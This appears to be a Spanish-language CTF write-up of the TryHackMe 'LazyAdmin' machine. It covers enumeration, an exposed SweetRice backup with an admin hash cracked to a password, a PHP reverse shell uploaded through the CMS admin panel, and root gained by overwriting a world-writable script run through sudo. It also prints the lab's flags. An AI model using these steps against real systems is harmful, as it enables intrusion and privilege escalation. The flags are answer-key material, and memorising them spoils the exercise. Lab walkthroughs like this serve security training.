---
layout: post
title: Tryhackme - LazyAdmin
autor: S3cureroy
date: 2023-08-27
categories: [CTF, Tryhackme]
tags: [ cms, sweetrice, enumeración, web, disclosure, dirsearch, jhon the ripper, linux, misconfiguration, sudo ]
---

La entrada de hoy, para variar, trata sobre la resolución de una máquina Linux, que además tiene un CMS expuesto, con una vulnerabilidad que permite su acceso inicial.

Y es que sé que me repito mucho con la forma de resolver las diferentes máquinas, pero es que la verdad, me siento mucho más cómodo usando el sistema operativo del pingüino, además de que en cada una de las entradas existe alguna novedad a la que recurro de vez en cuando (Y como esto pretende ser mi fuente de documentación, pues...).

Mi idea, es empezar con otro tipo de retos, que además no se encuentren retirados ya de las diferentes plataformas de CTF.
---

## Enumeración.

Se comienza la enumeración mediante el lanzamiento del comando ```nmap```, para obtener los puertos que se encuentran abiertos. Obteniendo, los puertos 80 y 22 que pertenecen a los servicios de Apache, y OpenSSH respectivamente.

```s
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-30 17:02 EDT
Warning: 10.10.229.41 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.229.41
Host is up (0.083s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
```

Se comienza la enumeración del servicio WEB, mediante un descubrimiento de directorios con el programa ```dirsearch``` sobre la raíz, encontrando el directorio **/content**.

```s
[17:03:50] Starting: 
[17:03:53] 403 -  277B  - /.htaccess-dev                              
[17:03:53] 403 -  277B  - /.htaccess-local
[17:03:53] 403 -  277B  - /.htaccess-marco
[17:03:53] 403 -  277B  - /.htaccess.bak1
[17:03:53] 403 -  277B  - /.htaccess.save
[17:03:53] 403 -  277B  - /.htaccess.sample
[17:03:53] 403 -  277B  - /.htaccessOLD
[17:03:53] 403 -  277B  - /.htaccess.orig
[17:03:53] 403 -  277B  - /.htaccessBAK
[17:03:53] 403 -  277B  - /.htaccess.old
[17:03:53] 403 -  277B  - /.htaccess.txt
[17:03:53] 403 -  277B  - /.htaccessOLD2
[17:03:53] 403 -  277B  - /.htpasswd-old
[17:03:53] 403 -  277B  - /.httr-oauth
[17:03:55] 403 -  277B  - /.php                                       
[17:03:56] 200 -   11KB - /                                                       
[17:04:08] 301 -  314B  - /content  ->  http://10.10.229.41/content/
[17:04:14] 200 -   11KB - /index.html
[17:04:24] 403 -  277B  - /server-status
[17:04:24] 403 -  277B  - /server-status/
```


Se vuelve a lanzar el mismo comando, pero esta vez sobre el directorio encontrado previamente, encontrando varios recursos de interés.

```s
[11:58:18] Starting: 
[11:58:22] 403 -  276B  - /content/.htaccess-local                    
[11:58:22] 403 -  276B  - /content/.htaccess-dev
[11:58:22] 403 -  276B  - /content/.htaccess-marco
[11:58:23] 403 -  276B  - /content/.htaccess.old
[11:58:23] 403 -  276B  - /content/.htaccess.save
[11:58:23] 403 -  276B  - /content/.htaccess.bak1
[11:58:23] 403 -  276B  - /content/.htaccess.orig
[11:58:23] 403 -  276B  - /content/.htaccess.txt
[11:58:23] 403 -  276B  - /content/.htaccess.sample
[11:58:23] 403 -  276B  - /content/.htaccessOLD
[11:58:23] 403 -  276B  - /content/.htaccessBAK
[11:58:23] 403 -  276B  - /content/.htaccessOLD2
[11:58:23] 403 -  276B  - /content/.htpasswd-old
[11:58:23] 403 -  276B  - /content/.httr-oauth
[11:58:24] 403 -  276B  - /content/.php                               
[11:58:35] 200 -   18KB - /content/changelog.txt
[11:58:42] 301 -  319B  - /content/images  ->  http://10.10.247.2/content/images/
[11:58:43] 301 -  316B  - /content/inc  ->  http://10.10.247.2/content/inc/
[11:58:43] 200 -    7KB - /content/inc/  
[11:58:43] 200 -    2KB - /content/index.php
[11:58:43] 200 -    2KB - /content/index.php/login/  
[11:58:44] 301 -  315B  - /content/js  ->  http://10.10.247.2/content/js/
[11:58:45] 200 -   15KB - /content/license.txt   
```

## Acceso inicial.

Uno de los directorios que parece interesante es el directorio **/inc**, que al entrar se vé que tiene la configuración del listado de directorios activada, obteniendo la siguiente información relevante:

   - En el directorio llamado **mysql_backup** se encuentra un fichero, aparentemente, de backup.
   - En el fichero **lastest.txt** se puede ver que la versión del CMS instalado es la 1.5.1.
   - Se confirma dicha versión en fichero **/content/changelog.txt**, mediante la línea "Change log V1.5.1 12/20/2015".

Buscando con el comando ```searchexploit``` el CMS y la versión instalada, se encuentran varias vulnerabilidades interesantes.

```
SweetRice 1.5.1 - Arbitrary File Download| php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload| php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure| php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery| php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution| php/webapps/40700.html
```

Revisando el exploit [40718](https://www.exploit-db.com/exploits/40718) se puede ver que el CMS almacena los *backup* en un directorio llamado **/inc/mysql_backup**, que al acceder, se confirma la exposición de los *backup*.
  
![LazyAdmin1][LazyAdmin1]

Se analiza el fichero, obteniendo cierta información muy sensible, sobre todo en lo referente a usuarios y contraseñas.

Como se puede ver en la siguiente imagen, se obtiene el *hash* de la contraseña del usuario **admin**.

![LazyAdmin2][LazyAdmin2]

Se identifica el hash mediante la herramienta **hash-identifier**, mostrando que está en formato MD5.

```s
hash-identifier 42f749ade7f9e195bf475f37a44cafcb                                                                                                                                                                 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
```

Se utiliza la herramienta **john the ripper** para intentar romper la contraseña. Se obtiene que ésta es **Password123**.

```shell
john --show --format=raw-md5 hash                                                                             
?:Password123

1 password hash cracked, 0 left
```

Mediante las credenciales obtenidas (admin:Password123) se intenta entrar en la consola de administración del CMS en la ruta **/content/as**, ganando acceso satisfactoriamente.

![LazyAdmin3][LazyAdmin3]

Una vez dentro de la sección de administración, se intenta subir y ejecutar una shell reversa, y así, acceder mediante consola al servidor.

Para ello, se procede a crear un "ad" en dicha sección, subiendo una shell reversa de [Pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) y poniendo a escuchar en el puerto configurado en la shell, la máquina atacante.  

![LazyAdmin4][LazyAdmin4]

Cuando se accede al recurso almacenado en la ruta **/content/inc/ads**, conecta con el puerto configurado, y a la escucha en la máquina atacante, obteniendo una sesión con el usuario de apache (www-data).

![LazyAdmin5][LazyAdmin5]

El usuario tiene el permiso necesario para ver la primera flag en el directorio Home del usuario **itguy** (**THM{63e5bce9271952aad1113b6f1ac28a07}**)  

![LazyAdmin6][LazyAdmin6]

## Escalada de privilegios.

Una vez dentro de la máquina, el objetivo es escalar privilegios para obtener la otra flag.

Para ello, se revisa qué puede ejecutar el usuario con el que se tiene la sesión abierta mediante el comando ```sudo```, obteniendo que puede ejecutar un fichero en formato perl del mismo directorio donde se encontraba la flag. 

```shell
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Se revisan los permisos del fichero, para modificarlo, y así llamar una shell ya con permisos de root, pero no es el caso.

```shell
ls -lrt /home/itguy/backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
```

Revisando el contenido del fichero se observa que éste ejecuta un tercer fichero llamado **/etc/copy.sh**.

```shell
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Al revisar los permisos de este tercer fichero, se puede ver que el grupo de permisos perteneciente al resto de usuarios que no son ni propietario, ni el grupo propietario, dispone de todos los permisos (lectura, escritura y ejecución).

```shell
$ ls -lrt /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

Por tanto, se va a explotar este error de configuración de la siguiente manera:

- Se modifica el fichero para el se disponen permiso para que ejecute a una shell de bash.

```shell
echo /bin/bash > /etc/copy.sh
```

- Se ejecuta el script para el que se disponen permisos de ejecución con sudo, que a su vez ejecutará el script modificado, dando lugar a la generación de una shell con permisos de root.

```shell
$ sudo perl /home/itguy/backup.pl
```

```shell
id
uid=0(root) gid=0(root) groups=0(root)
```

Para terminar, ya sólo queda obtener la flag de root. (THM{6637f41d0177b6f37cb20d775124699f})

```shell
cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

![LazyAdmin7][LazyAdmin7]


Y hasta aquí mi resolución de la máquina Lazy Admin. Como siempre digo en los post, seguramente existan otras formas de acceso o de escalada de privilegios.

Espero que os haya gustado, y recordad las redes sociales si queréis contactar conmigo.

Salu2!!!



[LazyAdmin1]: https://i.imgur.com/cq4KrWp.png
[LazyAdmin2]: https://i.imgur.com/CZOiWWa.png
[LazyAdmin3]: https://i.imgur.com/jk2vOSg.png
[LazyAdmin4]: https://i.imgur.com/SMft1pL.png
[LazyAdmin5]: https://i.imgur.com/PPUfCS3.png
[LazyAdmin6]: https://i.imgur.com/FwBN7pG.png
[LazyAdmin7]: https://i.imgur.com/WQYCv4t.png